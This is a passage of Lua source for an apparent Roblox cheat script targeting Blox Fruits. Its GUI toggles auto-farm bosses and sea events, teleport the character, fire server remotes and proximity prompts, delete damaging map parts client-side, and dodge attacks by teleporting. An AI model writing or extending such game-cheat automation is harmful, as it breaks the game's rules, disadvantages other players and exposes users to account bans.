                        tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
                    else
                        tween(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
                        ReplicatedStorage.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({{NPC = "Dragon Wizard", Command = "DragonRace"}}))
                    end
                end)
            end
        end
    end)

    v:AddToggle({
        Name = "Upgrade Dragon Talon",
        Default = false,
        Callback = function(dtUzoth)
            _G.DT_Uzoth = dtUzoth
        end,
    })

    spawn(function()
        while wait(1) do
            if _G.DT_Uzoth then
                local cframe = CFrame.new(5661.89014, 1211.31909, 864.836731, 0.811413169, -1.36805838e-08, -0.584473014, 4.75227395e-08, 1, 4.25682458e-08, 0.584473014, -6.23161966e-08, 0.811413169)
                tween(cframe)

                if (cframe.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25 then
                    ReplicatedStorage.Modules.Net["RF/InteractDragonQuest"]:InvokeServer({NPC = "Uzoth", Command = "Upgrade"})
                end
            end
        end
    end)

    local localPlayer2 = game:GetService("Players").LocalPlayer
    local map = workspace:WaitForChild("Map")
    workspace:WaitForChild("_WorldOrigin"):WaitForChild("Locations")
    local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
    v3:AddSection("Prehistoric Island")

    v3:AddToggle({
        Name = "Auto Craft Volcanic Magnet",
        Default = false,
        Callback = function(craftVM)
            _G.CraftVM = craftVM

            if craftVM then
                spawn(function()
                    while _G.CraftVM do
                        task.wait(1)

                        pcall(function()
                            if LayMaterial("Volcanic Magnet") < 1 then
                                if LayMaterial("Scrap Metal") >= 10 and LayMaterial("Blaze Ember") >= 15 then
                                    ReplicatedStorage2.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Volcanic Magnet")
                                elseif LayMaterial("Scrap Metal") < 10 then
                                    local v14 = MobCheck("Forest Pirate")

                                    if v14 then
                                        repeat
                                            task.wait()
                                            Kill(v14, _G.CraftVM)
                                        until not _G.CraftVM or not v14.Parent or v14.Humanoid.Health <= 0 or LayMaterial("Scrap Metal") >= 10
                                    else
                                        tween(CFrame.new(-13206.452, 425.892, -7964.554))
                                    end
                                elseif LayMaterial("Blaze Ember") < 15 then
                                    repeat
                                        task.wait()
                                        _G.FarmBlazeEM = true
                                    until not _G.CraftVM or LayMaterial("Blaze Ember") >= 15

                                    _G.FarmBlazeEM = false
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddButton({
        Name = "Craft Volcanic Magnet",
        Callback = function()
            ReplicatedStorage2.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Volcanic Magnet")
        end,
    })

    v3:AddToggle({
        Name = "Auto Prehistoric Island",
        Default = false,
        Callback = function(prehisFind)
            _G.Prehis_Find = prehisFind
        end,
    })

    spawn(function()
        while wait() do
            if _G.Prehis_Find then
                pcall(function()
                    if workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island", true) then
                        local prehistoricIsland = workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island")

                        if prehistoricIsland and (prehistoricIsland.CFrame.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude >= 2000 then
                            tween2(prehistoricIsland.CFrame)
                        end

                        if workspace.Map:FindFirstChild("PrehistoricIsland", true) then
                            local activationPrompt = workspace.Map.PrehistoricIsland.Core:FindFirstChild("ActivationPrompt")

                            if activationPrompt then
                                local proximityPrompt = activationPrompt:FindFirstChild("ProximityPrompt", true)

                                if proximityPrompt then
                                    if localPlayer2:DistanceFromCharacter(activationPrompt.CFrame.Position) <= 150 then
                                        fireproximityprompt(proximityPrompt, math.huge)
                                        VirtualInputManager:SendKeyEvent(true, "E", false, game)
                                        wait(1.5)
                                        VirtualInputManager:SendKeyEvent(false, "E", false, game)
                                    end

                                    tween2(activationPrompt.CFrame)
                                end
                            end
                        end
                    else
                        local v14 = CheckBoat()

                        if v14 then
                            if localPlayer2.Character.Humanoid.Sit == false then
                                local n2 = v14.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                                tween2(n2)
                            else
                                local cframe

                                repeat
                                    wait()
                                    cframe = CFrame.new(-10000000, 31, 37016.25)

                                    if not CheckEnemiesBoat() and not CheckTerrorShark() and not CheckPirateGrandBrigade() then
                                        tween2(cframe)
                                    else
                                        tween2(CFrame.new(-10000000, 150, 37016.25))
                                    end
                                until not _G.Prehis_Find or (cframe.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude <= 10 or workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") or localPlayer2.Character.Humanoid.Sit == false

                                localPlayer2.Character.Humanoid.Sit = false
                            end
                        else
                            local cframe = CFrame.new(-16927.451, 9.086, 433.864)
                            tween(cframe)

                            if (cframe.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                ReplicatedStorage2.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                            end
                        end
                    end
                end)
            end
        end
    end)

    v3:AddToggle({
        Name = "Auto Kill Lava Golem",
        Default = false,
        Callback = function(prehisSkills)
            _G.Prehis_Skills = prehisSkills

            if prehisSkills then
                spawn(function()
                    while _G.Prehis_Skills do
                        task.wait()

                        pcall(function()
                            local prehistoricIsland = map:FindFirstChild("PrehistoricIsland")

                            if prehistoricIsland then
                                for k, descendant in pairs(prehistoricIsland:GetDescendants()) do
                                    if (descendant:IsA("Part") or descendant:IsA("MeshPart")) and descendant.Name:lower():find("lava") then
                                        descendant:Destroy()
                                    end
                                end

                                local core = prehistoricIsland:FindFirstChild("Core")

                                if core then
                                    local interiorLava = core:FindFirstChild("InteriorLava")

                                    if interiorLava and interiorLava:IsA("Model") then
                                        interiorLava:Destroy()
                                    end
                                end

                                local trialTeleport = prehistoricIsland:FindFirstChild("TrialTeleport")

                                for k, descendant in pairs(prehistoricIsland:GetDescendants()) do
                                    if descendant.Name == "TouchInterest" and (not trialTeleport or not descendant:IsDescendantOf(trialTeleport)) then
                                        descendant.Parent:Destroy()
                                    end
                                end
                            end
                        end)
                    end
                end)

                spawn(function()
                    while _G.Prehis_Skills do
                        task.wait()

                        pcall(function()
                            local v14, prehistoricIsland, core, volcanoRocks, v15, v16, v17, v18, v19, v20, vfxLayer, glow, n2
                            n2 = 1

                            while true do
                                if n2 == 1 then
                                    if workspace.Enemies:FindFirstChild("Lava Golem") then
                                        n2 = 2
                                    else
                                        n2 = 4
                                    end
                                elseif n2 == 2 then
                                    v14 = MobCheck("Lava Golem")

                                    if v14 then
                                        n2 = 3
                                    else
                                        n2 = 4
                                    end
                                elseif n2 == 3 then
                                    task.wait()
                                    Kill(v14, _G.Prehis_Skills)
                                    v14.Humanoid:ChangeState(15)

                                    if _G.Prehis_Skills and v14.Parent and v14.Humanoid.Health > 0 then
                                        n2 = 3
                                    else
                                        n2 = 4
                                    end
                                elseif n2 == 4 then
                                    prehistoricIsland = map:FindFirstChild("PrehistoricIsland")

                                    if prehistoricIsland then
                                        n2 = 5
                                    else
                                        n2 = 14
                                    end
                                elseif n2 == 5 then
                                    core = prehistoricIsland:FindFirstChild("Core")

                                    if core then
                                        n2 = 6
                                    else
                                        n2 = 14
                                    end
                                elseif n2 == 6 then
                                    volcanoRocks = core:FindFirstChild("VolcanoRocks")

                                    if volcanoRocks then
                                        n2 = 7
                                    else
                                        n2 = 14
                                    end
                                elseif n2 == 7 then
                                    v15, v16, v17 = pairs(volcanoRocks:GetChildren())
                                    v18 = v17
                                    n2 = 8
                                elseif n2 == 8 then
                                    v19, v20 = v15(v16, v18)

                                    if v19 == nil then
                                        n2 = 14
                                    else
                                        n2 = 9
                                    end
                                elseif n2 == 9 then
                                    v18 = v19
                                    vfxLayer = v20:FindFirstChild("VFXLayer")

                                    if vfxLayer and vfxLayer:FindFirstChild("At0") then
                                        n2 = 10
                                    else
                                        n2 = 8
                                    end
                                elseif n2 == 10 then
                                    glow = vfxLayer.At0:FindFirstChild("Glow")

                                    if glow and glow.Enabled then
                                        n2 = 11
                                    else
                                        n2 = 8
                                    end
                                elseif n2 == 11 then
                                    task.wait()
                                    tween(vfxLayer.CFrame)

                                    if glow.Enabled and localPlayer2:DistanceFromCharacter(vfxLayer.Position) <= 150 then
                                        n2 = 12
                                    else
                                        n2 = 13
                                    end
                                elseif n2 == 12 then
                                    MousePos = vfxLayer.Position
                                    _S("Melee", "Z")
                                    task.wait(0.5)
                                    _S("Melee", "X")
                                    task.wait(0.5)
                                    _S("Melee", "C")
                                    task.wait(0.5)
                                    _S("Blox Fruit", "Z")
                                    task.wait(0.5)
                                    _S("Blox Fruit", "X")
                                    task.wait(0.5)
                                    _S("Blox Fruit", "C")
                                    n2 = 13
                                elseif n2 == 13 then
                                    if _G.Prehis_Skills and glow.Enabled then
                                        n2 = 11
                                    else
                                        n2 = 8
                                    end
                                elseif n2 == 14 then
                                    return
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Collect Dragon Egg",
        Default = false,
        Callback = function(prehisDe)
            _G.Prehis_DE = prehisDe

            if prehisDe then
                spawn(function()
                    while _G.Prehis_DE do
                        task.wait(1)

                        pcall(function()
                            local prehistoricIsland = map:FindFirstChild("PrehistoricIsland")

                            if prehistoricIsland then
                                local core = prehistoricIsland:FindFirstChild("Core")

                                if core then
                                    local spawnedDragonEggs = core:FindFirstChild("SpawnedDragonEggs")

                                    if spawnedDragonEggs then
                                        local dragonEgg = spawnedDragonEggs:FindFirstChild("DragonEgg")

                                        if dragonEgg then
                                            local molten = dragonEgg:FindFirstChild("Molten")

                                            if molten and molten:FindFirstChild("ProximityPrompt") then
                                                tween(molten.CFrame)
                                                fireproximityprompt(molten.ProximityPrompt, 30)
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Collect Dinosaur Bones",
        Default = false,
        Callback = function(prehisDb)
            _G.Prehis_DB = prehisDb

            if prehisDb then
                spawn(function()
                    while _G.Prehis_DB do
                        task.wait(1)

                        pcall(function()
                            if workspace:FindFirstChild("DinoBone") then
                                for k, child in pairs(workspace:GetChildren()) do
                                    if child.Name == "DinoBone" then
                                        tween(child.CFrame)
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    v3:AddToggle({
        Name = "Auto Reset After Finishing",
        Default = false,
        Callback = function(resetPH)
            _G.ResetPH = resetPH

            if resetPH then
                spawn(function()
                    while _G.ResetPH do
                        task.wait(1)

                        pcall(function()
                            local prehistoricIsland = map:FindFirstChild("PrehistoricIsland")

                            if prehistoricIsland then
                                local trialTeleport = prehistoricIsland:FindFirstChild("TrialTeleport")

                                if trialTeleport and trialTeleport:FindFirstChild("TouchInterest") then
                                    localPlayer2.Character.Humanoid.Health = 0
                                elseif workspace:FindFirstChild("DinoBone") then
                                    for k, child in pairs(workspace:GetChildren()) do
                                        if child.Name == "DinoBone" then
                                            tween(child.CFrame)
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end,
    })

    local Spy = v:AddParagraph("Spy", "")

    spawn(function()
        while wait(0.2) do
            pcall(function()
                local v14 = string.match(ReplicatedStorage2.Remotes.CommF_:InvokeServer("InfoLeviathan", "1"), "%d+")

                if v14 then
                    Spy:Set(" Spy: " .. tostring(v14))

                    if tostring(v14) == "5" then
                        Spy:Set("Ready for Levi!")
                    end
                end
            end)
        end
    end)

    RunService2.RenderStepped:Connect(checkBoat)
    _G.DodgeSkill = false

    IsDoingSeaEvent = function()
        local v14 = CheckShark()
        local shark = v14 and _G.Shark

        if not shark then
            local v15 = CheckTerrorShark()
            shark = v15 and _G.TerrorShark
        end

        if not shark then
            local v15 = CheckFishCrew()
            shark = v15 and _G.MobCrew
        end

        if not shark then
            local v15 = CheckPiranha()
            shark = v15 and _G.Piranha
        end

        if not shark then
            local v15 = CheckEnemiesBoat()
            shark = v15 and _G.FishBoat
        end

        if not shark then
            local v15 = CheckSeaBeast()
            shark = v15 and _G.seabeatfarm
        end

        if not shark then
            local pgb = _G.PGB
            shark = pgb and CheckPirateGrandBrigade()
        end

        if not shark then
            local hcm = _G.HCM
            shark = hcm and CheckHauntedCrew()
        end

        return shark
    end

    spawn(function()
        while wait() do
            if _G.SailBoats then
                pcall(function()
                    local v14 = CheckBoat()

                    if not v14 and not IsDoingSeaEvent() then
                        local cframe = CFrame.new(-16927.451, 9.086, 433.864)
                        tween2(cframe)

                        if (cframe.Position - localPlayer2.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            ReplicatedStorage2.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end
                    elseif v14 then
                        local humanoid = localPlayer2.Character:WaitForChild("Humanoid")

                        if IsDoingSeaEvent() then
                            humanoid.Sit = false
                            fn2()
                            return
                        end

                        if humanoid.Sit == false then
                            local n2 = v14.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                            tween2(n2)
                        else
                            if _G.DangerSc == "Lv 1" then
                                local cframe = CFrame.new(-21998.375, 30.0006084, -682.309143)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv 2" then
                                local cframe = CFrame.new(-26779.5215, 30.0005474, -822.858032)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv 3" then
                                local cframe = CFrame.new(-31171.957, 30.0001011, -2256.93774)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv 4" then
                                local cframe = CFrame.new(-34054.6875, 30.2187767, -2560.12012)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv 5" then
                                local cframe = CFrame.new(-38887.5547, 30.0004578, -2162.99023)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv 6" then
                                local cframe = CFrame.new(-44541.7617, 30.0003204, -1244.8584)
                                CFrameSelectedZone = cframe
                            elseif _G.DangerSc == "Lv Infinite" then
                                local cframe = CFrame.new(-10000000, 31, 37016.25)
                                CFrameSelectedZone = cframe
                            end

                            while true do
                                task.wait()
                                if IsDoingSeaEvent() then
                                    break
                                end

                                if (_G.FishBoat or not CheckEnemiesBoat()) and (_G.PGB or not CheckPirateGrandBrigade()) and (_G.TerrorShark or not CheckTerrorShark()) then
                                    tween2(CFrameSelectedZone)
                                else
                                    tween2(CFrameSelectedZone * CFrame.new(0, 150, 0))
                                end

                                if not _G.SailBoats or IsDoingSeaEvent() or humanoid.Sit == false then
                                    return
                                end
                            end

                            humanoid.Sit = false
                            fn2()
                        end
                    end
                end)
            end
        end
    end)

    spawn(function()
        while wait(Sec) do
            pcall(function()
                local v14, v15, v16 = pairs(workspace.Boats:GetChildren())
                local v17 = v16
                local v18 = v14
                local v19 = v15

                while true do
                    local v20, v21 = v18(v19, v17)
                    if v20 == nil then
                        break
                    end

                    for k, descendant in pairs(workspace.Boats[v21.Name]:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            if not _G.SailBoats and not _G.Prehis_Find and not _G.FindMirage and not _G.SailBoat_Hydra and not _G.kitsunefind then
                                descendant.CanCollide = true
                            else
                                descendant.CanCollide = false
                            end
                        end
                    end

                    v17 = v20
                end
            end)
        end
    end)

    v:AddToggle({
        Name = "Drive To Hydra",
        Default = false,
        Callback = function(sailBoatHydra)
            _G.SailBoat_Hydra = sailBoatHydra
        end,
    })

    task.spawn(function()
        while task.wait(0.2) do
            if _G.SailBoat_Hydra then
                pcall(function()
                    local character = localPlayer2.Character
                    local humanoid = character and character:FindFirstChild("Humanoid")
                    local humanoidRootPart2 = character and character:FindFirstChild("HumanoidRootPart")
                    if not humanoid or not humanoidRootPart2 then
                        return
                    end
                    local v14 = CheckBoat()

                    if not v14 then
                        local cframe = CFrame.new(-16927, 9, 433)

                        if (cframe.Position - humanoidRootPart2.Position).Magnitude > 10 then
                            tween2(cframe)
                        else
                            ReplicatedStorage2.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end

                        return
                    end

                    if humanoid.Sit then
                        if not CheckEnemiesBoat() and not CheckPirateGrandBrigade() and not CheckTerrorShark() then
                            tween2(CFrame.new(5433, 35, 290))
                        else
                            tween2(CFrame.new(5433, 150, 290))
                        end
                    else
                        tween2(v14.VehicleSeat.CFrame * CFrame.new(0, 1, 0))
                    end
                end)
            end
        end
    end)

    v:AddToggle({
        Name = "Auto Escape Rough Sea",
        Description = "Tự động thoát khỏi Rough Sea",
        Default = false,
        Flag = "AutoEscapeRoughSea",
        Callback = function(autoEscapeRoughSea)
            _G.AutoEscapeRoughSea = autoEscapeRoughSea
        end,
    })

    task.spawn(function()
        local tbl5 = {
            ["Lv 1"] = Vector3.new(-21998, 30, -682),
            ["Lv 2"] = Vector3.new(-26779, 30, -822),
            ["Lv 3"] = Vector3.new(-31171, 30, -2256),
            ["Lv 4"] = Vector3.new(-34054, 30, -2560),
            ["Lv 5"] = Vector3.new(-38887, 30, -2162),
            ["Lv 6"] = Vector3.new(-44541, 30, -1244),
        }

        local function fn3(arg)
            local str = "Lv 1"
            local huge = math.huge

            for k, v14 in pairs(tbl5) do
                local magnitude = (arg - v14).Magnitude

                if magnitude < huge then
                    huge = magnitude
                    str = k
                end
            end

            return str
        end

        while task.wait(0.5) do
            if _G.AutoEscapeRoughSea and _G.DangerSc ~= "Lv Infinite" then
                pcall(function()
                    local flag = false
                    local localPlayer3 = game.Players.LocalPlayer
                    local playerGui = localPlayer3:FindFirstChild("PlayerGui")
                    local character = localPlayer3.Character
                    local humanoidRootPart2 = character and character:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart2 then
                        return
                    end

                    if playerGui then
                        for k, descendant in pairs(playerGui:GetDescendants()) do
                            if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and descendant.Visible then
                                local contentText = descendant.ContentText
                                local text = contentText or descendant.Text

                                if text ~= "" then
                                    local str = string.lower(text):gsub("[%s<>%[%]]", "")
                                    if not string.find(str, "roughsea") then
                                        continue
                                    end
                                    flag = true
                                    break
                                end

                                continue
                            end
                        end
                    end

                    if flag then
                        local v14 = fn3(humanoidRootPart2.Position)
                        local dangerSc = v14

                        if v14 == "Lv 1" then
                            dangerSc = "Lv 2"
                        elseif v14 == "Lv 2" then
                            dangerSc = "Lv 3"
                        elseif v14 == "Lv 3" then
                            dangerSc = "Lv 4"
                        elseif v14 == "Lv 4" then
                            dangerSc = "Lv 5"
                        elseif v14 == "Lv 5" then
                            dangerSc = "Lv 6"
                        elseif v14 == "Lv 6" then
                            dangerSc = "Lv 5"
                        end

                        if _G.DangerSc ~= dangerSc then
                            _G.DangerSc = dangerSc
                            fn2()

                            Window:Notify({
                                Title = "Đang thoát khỏi Rough Sea",
                                Content = "Vị trí: " .. v14 .. " → Đang đến " .. dangerSc,
                                Image = "rbxassetid://96220014754961",
                                Duration = 5,
                            })
                        end
                    end
                end)
            end
        end
    end)

    v:AddToggle({
        Name = "Dodge Skill",
        Default = false,
        Callback = function(dodgeSkill)
            _G.DodgeSkill = dodgeSkill
        end,
    })

    spawn(function()
        while task.wait() do
            if _G.DodgeSkill then
                pcall(function()
                    local v14, v15, v16 = pairs(workspace.Enemies:GetChildren())
                    local v17 = v16
                    local v18 = v14
                    local v19 = v15

                    while true do
                        local v20, v21 = v18(v19, v17)
                        if v20 == nil then
                            break
                        end
                        v17 = v20
                        local humanoidRootPart2 = v21:FindFirstChild("HumanoidRootPart")
                        local humanoid = v21:FindFirstChild("Humanoid")
                        local animator = humanoid and humanoid:FindFirstChild("Animator")

                        if humanoidRootPart2 and animator then
                            for i, v22 in ipairs(animator:GetPlayingAnimationTracks()) do
                                local animationId = v22.Animation.AnimationId

                                if (animationId == "rbxassetid://14977820392" or animationId == "rbxassetid://8708222556" or animationId == "rbxassetid://8708225668") and localPlayer2.Character and localPlayer2.Character:FindFirstChild("HumanoidRootPart") then
                                    localPlayer2.Character.HumanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 100, 0)
                                end
                            end

                            v17 = v20
                        end
                    end
                end)
            end
        end
    end)

    v:AddButton({
        Name = "Buy Levi Spy",
        Callback = function()
            ReplicatedStorage2:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("InfoLeviathan", "2")
        end,
    })

    local v14 = v:AddParagraph("Frozen Dimension", "")

    spawn(function()
        pcall(function()
            while wait(0.2) do
                if workspace._WorldOrigin.Locations:FindFirstChild("Frozen Dimension") then
                    v14:Set(" True")
                else
                    v14:Set(" False")
                end
            end
        end)
    end)

    v:AddToggle({
        Name = "Tween To Frozen Dimension",
        Default = false,
        Callback = function(frozenTP)
            _G.FrozenTP = frozenTP
        end,
    })

    spawn(function()
        while wait(0.1) do
            if _G.FrozenTP then
                pcall(function()
                    if workspace.Map:FindFirstChild("LeviathanGate") then
                        tween(workspace.Map.LeviathanGate.CFrame)
                        ReplicatedStorage2:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("OpenLeviathanGate")
                    end
                end)
            end
        end
    end)

    local n2 = 0
    local n3 = 0
    local n4 = 1

    GetWeaponList = function()
        local tbl5 = {}

        if _G.UseMelee then
            tbl5[#tbl5 + 1] = "Melee"
        end

        if _G.UseSword then
            tbl5[#tbl5 + 1] = "Sword"
        end

        if _G.UseGun then
            tbl5[#tbl5 + 1] = "Gun"
        end

        if _G.UseFruit then
            tbl5[#tbl5 + 1] = "Blox Fruit"
        end

        return tbl5
    end

    SwitchWeapon = function()
        if tick() - n3 < NoSkid then
            return
        end
        n3 = tick()
        local v15 = GetWeaponList()
        if #v15 == 0 then
            return
        end
        n4 = n4 % #v15 + 1
        weaponSc(v15[n4])
    end

    SpamSkill = function()
        if tick() - n2 < HNCU then
            return
        end
        n2 = tick()
        local v15 = GetWeaponList()
        if #v15 == 0 then
            return
        end
        local v16 = v15[n4]
        weaponSc(v16)
        task.wait()

        if v16 == "Melee" then
            if _G.MeleeZ then
                _S(v16, "Z")
            end

            if _G.MeleeX then
                _S(v16, "X")
            end

            if _G.MeleeC then
                _S(v16, "C")
            end
        elseif v16 == "Sword" then
            if _G.SwordZ then
                _S(v16, "Z")
            end

            if _G.SwordX then
                _S(v16, "X")
            end
        elseif v16 == "Blox Fruit" then
            if _G.BloxFruitZ then
                _S(v16, "Z")
            end

            if _G.BloxFruitX then
                _S(v16, "X")
            end

            if _G.BloxFruitC then
                _S(v16, "C")
            end

            if _G.BloxFruitV then
                _S(v16, "V")
            end

            if _G.BloxFruitF then
                _S(v16, "F")
            end
        elseif v16 == "Gun" then
            if _G.GunZ then
                _S(v16, "Z")
            end

            if _G.GunX then
                _S(v16, "X")
            end
        end
    end

    spawn(function()
        while wait() do
            pcall(function()
                local v15, v16, v17, v18, v19, v20, v21, v22, v23, v24, v25, v26, v27, v28, v29, v30, v31, v32, v33, v34
                local v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54
                local v55, v56, v57, v58, v59, v60, v61, v62, n5
                n5 = 1

                while true do
                    if n5 == 1 then
                        if _G.Shark and CheckShark() then
                            n5 = 2
                        else
                            n5 = 6
                        end
                    elseif n5 == 2 then
                        v15, v16, v17 = pairs(workspace.Enemies:GetChildren())
                        v18 = v17
                        n5 = 3
                    elseif n5 == 3 then
                        v19, v20 = v15(v16, v18)

                        if v19 == nil then
                            n5 = 6
                        else
                            n5 = 4
                        end
                    elseif n5 == 4 then
                        v18 = v19

                        if v20.Name == "Shark" and index.Alive(v20) then
                            n5 = 5
                        else
                            n5 = 3
                        end
                    elseif n5 == 5 then
                        task.wait()
                        tween(CFrame.new(v20.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v20.HumanoidRootPart.Position.Z))
                        KillSea(v20, _G.Shark)

                        if _G.Shark and v20.Parent and v20.Humanoid.Health > 0 then
                            n5 = 5
                        else
                            n5 = 3
                        end
                    elseif n5 == 6 then
                        if _G.TerrorShark and CheckTerrorShark() then
                            n5 = 7
                        else
                            n5 = 11
                        end
                    elseif n5 == 7 then
                        v21, v22, v23 = pairs(workspace.Enemies:GetChildren())
                        v24 = v23
                        n5 = 8
                    elseif n5 == 8 then
                        v25, v26 = v21(v22, v24)

                        if v25 == nil then
                            n5 = 11
                        else
                            n5 = 9
                        end
                    elseif n5 == 9 then
                        v24 = v25

                        if v26.Name == "Terrorshark" and index.Alive(v26) then
                            n5 = 10
                        else
                            n5 = 8
                        end
                    elseif n5 == 10 then
                        task.wait()
                        tween(CFrame.new(v26.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v26.HumanoidRootPart.Position.Z))
                        KillSea(v26, _G.TerrorShark)

                        if _G.TerrorShark and v26.Parent and v26.Humanoid.Health > 0 then
                            n5 = 10
                        else
                            n5 = 8
                        end
                    elseif n5 == 11 then
                        if _G.Piranha and CheckPiranha() then
                            n5 = 12
                        else
                            n5 = 16
                        end
                    elseif n5 == 12 then
                        v27, v28, v29 = pairs(workspace.Enemies:GetChildren())
                        v30 = v29
                        n5 = 13
                    elseif n5 == 13 then
                        v31, v32 = v27(v28, v30)

                        if v31 == nil then
                            n5 = 16
                        else
                            n5 = 14
                        end
                    elseif n5 == 14 then
                        v30 = v31

                        if v32.Name == "Piranha" and index.Alive(v32) then
                            n5 = 15
                        else
                            n5 = 13
                        end
                    elseif n5 == 15 then
                        task.wait()
                        tween(CFrame.new(v32.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v32.HumanoidRootPart.Position.Z))
                        KillSea(v32, _G.Piranha)

                        if _G.Piranha and v32.Parent and v32.Humanoid.Health > 0 then
                            n5 = 15
                        else
                            n5 = 13
                        end
                    elseif n5 == 16 then
                        if _G.MobCrew and CheckFishCrew() then
                            n5 = 17
                        else
                            n5 = 21
                        end
                    elseif n5 == 17 then
                        v33, v34, v35 = pairs(workspace.Enemies:GetChildren())
                        v36 = v35
                        n5 = 18
                    elseif n5 == 18 then
                        v37, v38 = v33(v34, v36)

                        if v37 == nil then
                            n5 = 21
                        else
                            n5 = 19
                        end
                    elseif n5 == 19 then
                        v36 = v37

                        if v38.Name == "Fish Crew Member" and index.Alive(v38) then
                            n5 = 20
                        else
                            n5 = 18
                        end
                    elseif n5 == 20 then
                        task.wait()
                        tween(CFrame.new(v38.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v38.HumanoidRootPart.Position.Z))
                        KillSea(v38, _G.MobCrew)

                        if _G.MobCrew and v38.Parent and v38.Humanoid.Health > 0 then
                            n5 = 20
                        else
                            n5 = 18
                        end
                    elseif n5 == 21 then
                        if _G.HCM and CheckHauntedCrew() then
                            n5 = 22
                        else
                            n5 = 26
                        end
                    elseif n5 == 22 then
                        v39, v40, v41 = pairs(workspace.Enemies:GetChildren())
                        v42 = v41
                        n5 = 23
                    elseif n5 == 23 then
                        v43, v44 = v39(v40, v42)

                        if v43 == nil then
                            n5 = 26
                        else
                            n5 = 24
                        end
                    elseif n5 == 24 then
                        v42 = v43

                        if v44.Name == "Haunted Crew Member" and index.Alive(v44) then
                            n5 = 25
                        else
                            n5 = 23
                        end
                    elseif n5 == 25 then
                        task.wait()
                        tween(CFrame.new(v44.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v44.HumanoidRootPart.Position.Z))
                        KillSea(v44, _G.HCM)

                        if _G.HCM and v44.Parent and v44.Humanoid.Health > 0 then
                            n5 = 25
                        else
                            n5 = 23
                        end
                    elseif n5 == 26 then
                        if _G.seabeatfarm then
                            n5 = 27
                        else
                            n5 = 33
                        end
                    elseif n5 == 27 then
                        v45, v46, v47 = pairs(workspace.SeaBeasts:GetChildren())
                        v48 = v47
                        n5 = 28
                    elseif n5 == 28 then
                        v49, v50 = v45(v46, v48)

                        if v49 == nil then
                            n5 = 33
                        else
                            n5 = 29
                        end
                    elseif n5 == 29 then
                        v48 = v49

                        if v50:FindFirstChild("HumanoidRootPart") and v50:FindFirstChild("Health") and v50.Health.Value > 0 then
                            n5 = 30
                        else
                            n5 = 28
                        end
                    elseif n5 == 30 then
                        task.wait()
                        tween(CFrame.new(v50.HumanoidRootPart.Position.X, workspace.Map["WaterBase-Plane"].Position.Y + 200, v50.HumanoidRootPart.Position.Z))

                        if localPlayer2:DistanceFromCharacter(v50.HumanoidRootPart.Position) <= 500 then
                            n5 = 31
                        else
                            n5 = 32
                        end
                    elseif n5 == 31 then
                        MousePos = v50.HumanoidRootPart.Position
                        SpamSkill()
                        n5 = 32
                    elseif n5 == 32 then
                        if _G.seabeatfarm and v50.Parent and v50.Health.Value > 0 then
                            n5 = 30
                        else
                            n5 = 28
                        end
                    elseif n5 == 33 then
                        if _G.FishBoat then
                            n5 = 34
                        else
                            n5 = 40
                        end
                    elseif n5 == 34 then
                        v51, v52, v53 = pairs(workspace.Enemies:GetChildren())
                        v54 = v53
                        n5 = 35
                    elseif n5 == 35 then
                        v55, v56 = v51(v52, v54)

                        if v55 == nil then
                            n5 = 40
                        else
                            n5 = 36
                        end
                    elseif n5 == 36 then
                        v54 = v55

                        if v56:FindFirstChild("VehicleSeat") and v56:FindFirstChild("Health") and v56.Health.Value > 0 then
                            n5 = 37
                        else
                            n5 = 35
                        end
                    elseif n5 == 37 then
                        task.wait()
                        tween(v56.Engine.CFrame * CFrame.new(0, -50, -25))

                        if localPlayer2:DistanceFromCharacter(v56.Engine.Position) <= 150 then
                            n5 = 38
                        else
                            n5 = 39
                        end
                    elseif n5 == 38 then
                        MousePos = v56.Engine.Position
                        SpamSkill()
                        n5 = 39
                    elseif n5 == 39 then
                        if _G.FishBoat and v56.Health.Value > 0 then
                            n5 = 37
                        else
                            n5 = 35
                        end
                    elseif n5 == 40 then
                        if _G.PGB then
                            n5 = 41
                        else
                            n5 = 50
                        end
